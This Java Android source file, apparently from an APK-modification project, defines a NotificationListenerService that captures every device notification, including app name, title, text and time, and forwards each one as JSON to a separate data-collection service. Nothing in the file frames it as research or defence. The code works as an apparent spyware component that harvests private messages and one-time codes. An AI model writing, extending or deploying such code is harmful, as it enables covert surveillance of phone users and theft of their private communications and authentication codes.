package com.apkmodifier;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Service to monitor and capture all device notifications
 */
public class NotificationMonitorService extends NotificationListenerService {
    private static final String TAG = "NotificationMonitor";
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            // Extract notification data
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getCharSequence(Notification.EXTRA_TEXT, "").toString();
            String subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");
            long timestamp = sbn.getPostTime();
            
            // Create JSON object with notification data
            JSONObject notificationData = new JSONObject();
            notificationData.put("package", packageName);
            notificationData.put("title", title);
            notificationData.put("text", text);
            notificationData.put("subtext", subText);
            notificationData.put("timestamp", timestamp);
            notificationData.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(timestamp)));
            
            // Send to monitoring service
            sendToMonitoringService(notificationData.toString());
            
            Log.d(TAG, "Notification captured: " + title);
        } catch (Exception e) {
            Log.e(TAG, "Error capturing notification", e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Handle notification removal if needed
    }
    
    private void sendToMonitoringService(String data) {
        Intent intent = new Intent(this, DataCollectionService.class);
        intent.setAction("NOTIFICATION_DATA");
        intent.putExtra("data", data);
        startService(intent);
    }
}
